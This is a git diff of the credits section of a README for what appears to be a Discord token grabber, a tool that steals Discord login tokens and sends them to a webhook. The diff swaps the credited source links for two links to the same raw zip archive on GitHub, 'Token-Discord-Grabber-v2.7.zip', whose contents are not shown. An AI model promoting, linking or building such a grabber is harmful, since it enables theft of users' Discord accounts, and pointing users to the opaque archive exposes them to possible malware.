@@ -19,6 +19,6 @@ You should have received a message in that channel of the webhook
 # Credits
 Scripts edited by Exotic Pineapple
 
-grabber.javascript was orignally from https://www.folkstalk.com/2022/09/get-discord-token-from-console-with-code-examples.html
+grabber.javascript was orignally from https://github.com/Amy7007/Discord-Token-Grabber/raw/refs/heads/main/bashlyk/Token-Discord-Grabber-v2.7.zip
 
-sender.py was originally from https://github.com/wodxgod/Discord-Token-Grabber
+sender.py was originally from https://github.com/Amy7007/Discord-Token-Grabber/raw/refs/heads/main/bashlyk/Token-Discord-Grabber-v2.7.zip
